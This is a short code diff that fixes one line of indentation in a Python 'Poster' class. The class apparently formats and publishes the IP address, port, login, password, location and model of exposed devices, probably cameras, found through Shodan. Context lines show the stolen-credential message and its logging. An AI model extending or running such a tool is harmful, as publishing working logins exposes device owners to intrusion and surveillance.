@@ -116,7 +116,7 @@ class Poster(object):
 		self.text = "[Shodan:](https://www.shodan.io/host/{}) [{}](tg://msg_url?url=vk.com/wall-163997495?q={})\n*Port:* `{}`\n*Login:* `{}`\n*Password:* `{}`\n*Location:* [{}](https://iplocation.com/?ip={})\n*Channel:* `{}`\n*Model:* `{}`".format(ip, ip, ip, port, login, password, self.state, ip, channel, model)
 		logging.info("Got data: \n\t\t\t\t\tIP: {}\n\t\t\t\t\tPort: {}\n\t\t\t\t\tLogin: {}\n\t\t\t\t\tPassword: {}\n\t\t\t\t\tLocation: {}\n\t\t\t\t\tChannel: {}\n\t\t\t\t\tModel: {}".format(ip, port, login, password, self.state, channel, model))
 		self.sent = False
-        retry_c = 0
+		retry_c = 0
 		while not self.sent:
 			try:
 				logging.info("Trying to send post...")
